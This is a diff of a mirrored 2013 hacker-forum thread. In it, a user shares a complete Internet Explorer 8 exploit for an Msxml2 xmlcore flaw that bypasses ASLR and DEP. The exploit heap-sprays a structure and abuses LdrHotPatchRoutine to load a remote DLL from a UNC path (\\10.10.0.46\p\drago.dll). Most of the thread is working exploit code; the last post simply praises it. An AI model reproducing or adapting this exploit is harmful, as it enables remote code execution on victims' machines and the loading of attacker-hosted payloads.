@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=4055&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:55 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=4055&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:55 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Windows 7 64bit exploitation using LdrHotPatchRoutine and bypassing ASLR+DEP</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -37,100 +34,100 @@
 	<li class="postbit blockbody" id="post_1">
 	<div class="header">
 		<div class="datetime">05-09-2013, 11:43 AM</div>
-		<span class="username">&quot;vinnu&quot;</span>
+		<span class="username">"vinnu"</span>
 	</div>
 	
 	
 		<div class="title">Windows 7 64bit exploitation using LdrHotPatchRoutine and bypassing ASLR+DEP</div>
 	
 	<div class="content">
-		<blockquote class="restore">Namaste<br />
-<br />
-LdrHotPatchroutine's pointer is located in 0x7ffe0350 in 64 bit win7 And it has the capability to load any DLL from any corner of the world using UAC path.<br />
-The only requirement for this API is its single argument that is a STRUCTURE. You place the address of this structure on stack and redirect your cpu to call LdrHoitPatchroutine and bang, your DLL is loaded.<br />
-<br />
-The structure is explained by Yu Yang and can be studied at <a href="../external.html?link=https://docs.google.com/file/d/0B46UFFNOX3K7bl8zWmFvRGVlamM/edit?usp=sharing" target="_blank">https://docs.google.com/file/d/0B46U...it?usp=sharing</a><br />
-<br />
-Now we will use this technique to exploit Internet Explorer without the use of any pointer leak. The selected vulnerability is in xmlcore module i.e.<br />
-<br />
+		<blockquote class="restore">Namaste<br/>
+<br/>
+LdrHotPatchroutine's pointer is located in 0x7ffe0350 in 64 bit win7 And it has the capability to load any DLL from any corner of the world using UAC path.<br/>
+The only requirement for this API is its single argument that is a STRUCTURE. You place the address of this structure on stack and redirect your cpu to call LdrHoitPatchroutine and bang, your DLL is loaded.<br/>
+<br/>
+The structure is explained by Yu Yang and can be studied at <a href="../external.html?link=https://docs.google.com/file/d/0B46UFFNOX3K7bl8zWmFvRGVlamM/edit?usp=sharing" target="_blank">https://docs.google.com/file/d/0B46U...it?usp=sharing</a><br/>
+<br/>
+Now we will use this technique to exploit Internet Explorer without the use of any pointer leak. The selected vulnerability is in xmlcore module i.e.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">var obj = new ActiveXObject(&quot;Msxml2.DOMDocument.6.0&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; var src = unescape(&quot;% u0c0c% u0c0c&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; while (src.length &lt; 0x1002) src += src;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; src = &quot;\\\\\\\\xxx&quot; + src;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; src = src.substr(2, 0x1000 - 10);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var pic = document.createElement(&quot;img&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; pic.src = src;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; pic.nameProp;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; obj.definition(1);</code><hr />
+	<hr/><code class="bbcode_code">var obj = new ActiveXObject("Msxml2.DOMDocument.6.0");<br/>
+        <br/>
+        var src = unescape("% u0c0c% u0c0c");<br/>
+        while (src.length &lt; 0x1002) src += src;<br/>
+        src = "\\\\\\\\xxx" + src;<br/>
+        src = src.substr(2, 0x1000 - 10);<br/>
+<br/>
+        var pic = document.createElement("img");<br/>
+        pic.src = src;<br/>
+        pic.nameProp;<br/>
+        obj.definition(1);</code><hr/>
 </div></blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
 	<div class="header">
 		<div class="datetime">05-09-2013, 11:59 AM</div>
-		<span class="username">&quot;vinnu&quot;</span>
+		<span class="username">"vinnu"</span>
 	</div>
 	
 	
 	<div class="content">
-		<blockquote class="restore">To exploit this vuln in IE8 we will use little heapspray to place our structure in memory. The structure has the DLL Name and the name of DLL to be patched.<br />
-The complete exploit code is :<br />
-<br />
+		<blockquote class="restore">To exploit this vuln in IE8 we will use little heapspray to place our structure in memory. The structure has the DLL Name and the name of DLL to be patched.<br/>
+The complete exploit code is :<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">&lt;html&gt;<br />
-&lt;head&gt;<br />
-&lt;title&gt;xmlcore module exploit bypasses ASLR+DEP&lt;/title&gt;<br />
-&lt;/head&gt;<br />
-&lt;body&gt;<br />
-&lt;script&gt;<br />
-var virtable = &quot;alfabetagammad\u1020\u0c10&quot;.substring(0x0e,0x20);<br />
-function spray()&nbsp; &nbsp; &nbsp; &nbsp; {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var highlim = 300;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var bsize = 0x040000;var hdr = 0x20//0x48;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var struct = &quot;\u0338\u7ffe\u4242\u4242\u0014\u0030\u0044&quot; +<br />
-&nbsp; &nbsp; &nbsp; &nbsp; +&quot;\u0012\u1212\u0004&quot;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; +&quot;\u005C\u005C\u0031\u0030\u002E\u0031\u0030\u002E\u0030\u002E\u0034\u0036\u005C\u0070\u005C\u0064\u0072\u0061\u0067\u006F\u002E\u0064\u006C\u006C&quot; \\10.10.0.46\p\drago.dll<br />
-&nbsp; &nbsp; &nbsp; &nbsp; +&quot;\u006E\u0074\u0064\u006C\u006C\u002e\u0064\u006C\u006C&quot;; \\ ntdll.dll<br />
-&nbsp; &nbsp; while(struct.length &lt; 0x200) {struct += virtable;}<br />
-&nbsp; &nbsp; &nbsp; &nbsp; block = struct.substring(0,0x100);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; while (block.length&lt;0x60000) {block += block}<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var hotpatch = block.substring(0, 0x40000 - hdr);<br />
-&nbsp; &nbsp; var heapb = new Array();<br />
-&nbsp; &nbsp; &nbsp; &nbsp; for (var iter=0;iter&lt;highlim;iter++){<br />
-&nbsp; &nbsp; &nbsp; &nbsp; heapb.push(document.createElement(&quot;div&quot;));<br />
-&nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; &nbsp; for (var iter=0;iter&lt;highlim;iter++){<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; heapb[iter].title = hotpatch;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-}<br />
-/*---------code exec section can be replaced ----*/<br />
-function trigger()&nbsp; &nbsp; &nbsp; &nbsp; {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var obj = new ActiveXObject(&quot;Msxml2.DOMDocument.6.0&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; //<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var src = virtable;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; while (src.length &lt; 0x1002) src += src;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; src = &quot;\\\\\\\\xxx&quot; + src;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; src = src.substr(2, 0x1000 - 10);<br />
-spray()<br />
-&nbsp; &nbsp; &nbsp; &nbsp; var pic = document.createElement(&quot;img&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; pic.src = src;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; pic.nameProp;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; obj.definition(1);<br />
-}<br />
-<br />
-&lt;/script&gt;<br />
-&lt;div id=&quot;div&quot;&gt;<br />
-&lt;object id=&quot;obj&quot; style=&quot;display:none&quot;&gt;&lt;/object&gt;<br />
-&lt;/div&gt;<br />
-&lt;input type=&quot;button&quot; value=&quot;Trigger&quot; onClick=&quot;window.setTimeout(trigger,100);&quot;&gt;<br />
-&lt;/body&gt;<br />
-&lt;/html&gt;</code><hr />
-</div>This technique reduces the size as well as the execution time of exploit only bottleneck is the download of DLL from UNC path.<br />
-...&quot;vinnu&quot;</blockquote>
+	<hr/><code class="bbcode_code">&lt;html&gt;<br/>
+&lt;head&gt;<br/>
+&lt;title&gt;xmlcore module exploit bypasses ASLR+DEP&lt;/title&gt;<br/>
+&lt;/head&gt;<br/>
+&lt;body&gt;<br/>
+&lt;script&gt;<br/>
+var virtable = "alfabetagammad\u1020\u0c10".substring(0x0e,0x20);<br/>
+function spray()        {<br/>
+        var highlim = 300;<br/>
+        var bsize = 0x040000;var hdr = 0x20//0x48;<br/>
+        var struct = "\u0338\u7ffe\u4242\u4242\u0014\u0030\u0044" +<br/>
+        +"\u0012\u1212\u0004"<br/>
+        +"\u005C\u005C\u0031\u0030\u002E\u0031\u0030\u002E\u0030\u002E\u0034\u0036\u005C\u0070\u005C\u0064\u0072\u0061\u0067\u006F\u002E\u0064\u006C\u006C" \\10.10.0.46\p\drago.dll<br/>
+        +"\u006E\u0074\u0064\u006C\u006C\u002e\u0064\u006C\u006C"; \\ ntdll.dll<br/>
+    while(struct.length &lt; 0x200) {struct += virtable;}<br/>
+        block = struct.substring(0,0x100);<br/>
+        while (block.length&lt;0x60000) {block += block}<br/>
+        var hotpatch = block.substring(0, 0x40000 - hdr);<br/>
+    var heapb = new Array();<br/>
+        for (var iter=0;iter&lt;highlim;iter++){<br/>
+        heapb.push(document.createElement("div"));<br/>
+    }<br/>
+        for (var iter=0;iter&lt;highlim;iter++){<br/>
+                heapb[iter].title = hotpatch;<br/>
+        }<br/>
+}<br/>
+/*---------code exec section can be replaced ----*/<br/>
+function trigger()        {<br/>
+        var obj = new ActiveXObject("Msxml2.DOMDocument.6.0");<br/>
+        //<br/>
+        var src = virtable;<br/>
+        while (src.length &lt; 0x1002) src += src;<br/>
+        src = "\\\\\\\\xxx" + src;<br/>
+        src = src.substr(2, 0x1000 - 10);<br/>
+spray()<br/>
+        var pic = document.createElement("img");<br/>
+        pic.src = src;<br/>
+        pic.nameProp;<br/>
+        obj.definition(1);<br/>
+}<br/>
+<br/>
+&lt;/script&gt;<br/>
+&lt;div id="div"&gt;<br/>
+&lt;object id="obj" style="display:none"&gt;&lt;/object&gt;<br/>
+&lt;/div&gt;<br/>
+&lt;input type="button" value="Trigger" onClick="window.setTimeout(trigger,100);"&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;</code><hr/>
+</div>This technique reduces the size as well as the execution time of exploit only bottleneck is the download of DLL from UNC path.<br/>
+..."vinnu"</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_3">
 	<div class="header">
@@ -150,9 +147,9 @@ spray()<br />
 	
 	
 	<div class="content">
-		<blockquote class="restore">Very nice Vinnu.<br />
-<br />
-koi muze analysis sikha do yaar :) <br />
+		<blockquote class="restore">Very nice Vinnu.<br/>
+<br/>
+koi muze analysis sikha do yaar :) <br/>
 Can't Understand which crash is exploitable and which one not.</blockquote>
 	</div>
 </li>
@@ -161,14 +158,14 @@ Can't Understand which crash is exploitable and which one not.</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:51 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:51 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -186,7 +183,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=4055&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:55 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=4055&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:55 GMT --></html>
